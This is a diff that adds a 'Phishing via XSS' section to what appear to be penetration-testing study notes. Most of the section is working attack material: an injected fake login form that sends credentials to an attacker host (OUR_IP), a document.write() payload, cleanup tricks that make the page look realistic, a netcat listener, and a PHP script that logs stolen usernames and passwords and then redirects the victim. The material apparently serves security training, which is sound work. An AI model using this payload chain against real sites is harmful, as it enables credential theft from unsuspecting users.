@@ -247,3 +247,78 @@ Although XSS is limited to browser execution, skilled attackers can escalate the
 
 ---
 
+# Phishing via XSS
+
+#### Overview
+- **Definition**: Phishing attacks use fake elements, like login forms, to collect sensitive information (e.g., credentials).
+- **Impact**: Exploited XSS vulnerabilities allow attackers to create phishing simulations or target real users.
+
+#### XSS Discovery
+- Identify a vulnerable input field.
+- Test XSS payloads to find one that executes JavaScript.
+- View how input is rendered in the page source to understand the necessary payload structure.
+
+#### Login Form Injection
+1. **HTML Code for Login Form**:
+   ```html
+   <h3>Please login to continue</h3>
+   <form action=http://OUR_IP>
+       <input type="username" name="username" placeholder="Username">
+       <input type="password" name="password" placeholder="Password">
+       <input type="submit" name="submit" value="Login">
+   </form>
+   ```
+   - Replace `OUR_IP` with the attacker's IP.
+   - The form collects credentials and sends them to the attacker's server.
+
+2. **JavaScript Payload**:
+   - Inject the form using `document.write()`:
+     ```javascript
+     document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+     ```
+     
+#### Cleaning Up
+- **Remove Elements**: Hide original elements to improve realism:
+  ```javascript
+  document.getElementById('urlform').remove();
+  ```
+- **Comment Unwanted Code**: Remove leftover HTML with:
+  ```html
+  ...PAYLOAD... <!--
+  ```
+
+#### Credential Stealing
+1. **Using Netcat**:
+   - Start a listener to capture credentials:
+     ```bash
+     sudo nc -lvnp 80
+     ```
+   - Captures data as HTTP requests (e.g., `/username=test&password=test`).
+
+2. **Using a PHP Script**:
+   - Write credentials to a file and redirect the user:
+     ```php
+     <?php
+     if (isset($_GET['username']) && isset($_GET['password'])) {
+         $file = fopen("creds.txt", "a+");
+         fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+         header("Location: http://SERVER_IP/phishing/index.php");
+         fclose($file);
+         exit();
+     }
+     ?>
+     ```
+   - Start the PHP server:
+     ```bash
+     mkdir /tmp/tmpserver
+     cd /tmp/tmpserver
+     vi index.php #at this step we wrote our index.php file
+     sudo php -S 0.0.0.0:80
+     
+     ```
+
+#### Exploitation
+- Share a malicious URL with the crafted XSS payload.
+- Once victims enter credentials, they are logged and stored on the attacker's server.
+
+
